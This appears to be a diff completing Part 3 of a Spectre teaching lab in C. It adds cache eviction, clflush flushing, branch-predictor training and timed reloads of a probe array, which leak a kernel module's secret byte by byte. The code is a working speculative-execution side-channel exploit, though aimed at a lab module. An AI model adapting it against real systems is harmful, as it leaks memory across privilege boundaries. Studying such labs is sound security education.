@@ -11,6 +11,27 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+#define EVICT_SIZE (11 * 1024 * 1024) // TODO 11 MB currently, should be tuned
+
+uint8_t *evict_buf;
+
+void init_evict_buf() {
+  evict_buf = malloc(EVICT_SIZE);
+
+  // Touch each page
+  for (size_t i = 0; i < EVICT_SIZE; i += 4096) {
+    evict_buf[i] = 1;
+  }
+}
+
+void evict_cache() {
+  for (int a = 0; a < 4; a++){ // #TODO of cycles should be tuned 
+    for (size_t i = 0; i < EVICT_SIZE; i += 4096) {
+      evict_buf[i] ^= 1;
+    }
+  }
+}
+
 /*
  * call_kernel_part3
  * Performs the COMMAND_PART3 call in the kernel
@@ -21,13 +42,65 @@
  *  - offset: The offset into the secret to try and read
  */
 static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
-    spectre_lab_command local_cmd;
-    local_cmd.kind = COMMAND_PART3;
-    local_cmd.arg1 = (uint64_t)shared_memory;
-    local_cmd.arg2 = offset;
+  spectre_lab_command local_cmd;
+  local_cmd.kind = COMMAND_PART3;
+  local_cmd.arg1 = (uint64_t)shared_memory;
+  local_cmd.arg2 = offset;
 
-    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
+  write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
+
+void flush_byte_arr(uint8_t *base){
+  for (int i = 0; i < 256; i++){
+    clflush(base + (i * 4096));
+  }
+}
+
+uint64_t* reload_byte_arr(uint8_t *base){
+  uint64_t* res = malloc(sizeof(uint64_t) * 256); // 256 64 bit time results
+  if (res == NULL) return NULL;
+  for (int i = 0; i < 256; i++){
+    res[i] = time_access(base + i * 4096);
+  }
+  return res;
+}
+
+int find_min_index(uint64_t *arr, int size) {
+  int min_index = 0;
+  uint64_t min_value = arr[0];
+
+  for (int i = 1; i < size; i++) {
+    if (arr[i] < min_value) {
+      min_value = arr[i];
+      min_index = i;
+    }
+  }
+
+  return min_index;
+}
+
+int find_max_index(uint64_t *arr, int size) {
+  int max_index = 0;
+  uint64_t max_value = arr[0];
+
+  for (int i = 1; i < size; i++) {
+    if (arr[i] > max_value) {
+      max_value = arr[i];
+      max_index = i;
+    }
+  }
+
+  return max_index;
+}
+
+
+void train_predictor(int kernel_fd, char *shared_memory){
+  for (int i = 0; i < 20; i++){
+    call_kernel_part3(kernel_fd, shared_memory, 0); // small offset to train predictor
+  }
+}
+
+
 
 /*
  * run_attacker
@@ -37,25 +110,62 @@ static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t 
  *  - shared_memory: A pointer to a region of memory shared with the kernel
  */
 int run_attacker(int kernel_fd, char *shared_memory) {
-    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
-    size_t current_offset = 0;
+  char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
+  size_t current_offset = 0;
 
-    printf("Launching attacker\n");
+  printf("Launching attacker\n");
 
-    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
+  init_evict_buf();
 
-        // [Part 3]- Fill this in!
-        // leaked_byte = ??
+  for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
+    char leaked_byte;
 
-        leaked_str[current_offset] = leaked_byte;
-        if (leaked_byte == '\x00') {
-            break;
-        }
+    // [Part 3]- Fill this in!
+    // Feel free to create helper methods as necessary.
+    // Use "call_kernel_part1" to interact with the kernel module
+    // Find the value of leaked_byte for offset "current_offset"
+    // leaked_byte = ??
+
+    uint64_t count[256] = {0};
+
+    for (int i = 0; i < 20; i++){
+
+      // train the branch predictor
+      train_predictor(kernel_fd, shared_memory);
+
+      // Evict part3_limit from cache with large eviction set
+      evict_cache();
+
+
+      flush_byte_arr(shared_memory);
+      //call_kernel_part3(kernel_fd, shared_memory, 5);
+      call_kernel_part3(kernel_fd, shared_memory, current_offset);
+      uint64_t* res = reload_byte_arr(shared_memory);
+
+      // DEBUG
+      //for (int i = 0; i < 256; i++) printf("Res of %ith byte: %i\n", i, res[i]);
+
+      // tick up index that had quickest time to access
+      count[find_min_index(res, 256)]++;
+      free(res);
     }
+    // pick index with quicket access times to predict secret
+    leaked_byte = find_max_index(count, 256);
 
-    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
+    // DEBUG
+    //for (int i = 0; i < 256; i++) printf("Count at index %i: %li\n", i, count[i]);
+    //printf("leaked %li", leaked_byte);
 
-    close(kernel_fd);
-    return EXIT_SUCCESS;
+
+    leaked_str[current_offset] = leaked_byte;
+    if (leaked_byte == '\x00') {
+      break;
+    }
+    //free(res);
+  }
+  free(evict_buf);
+  printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
+
+  close(kernel_fd);
+  return EXIT_SUCCESS;
 }
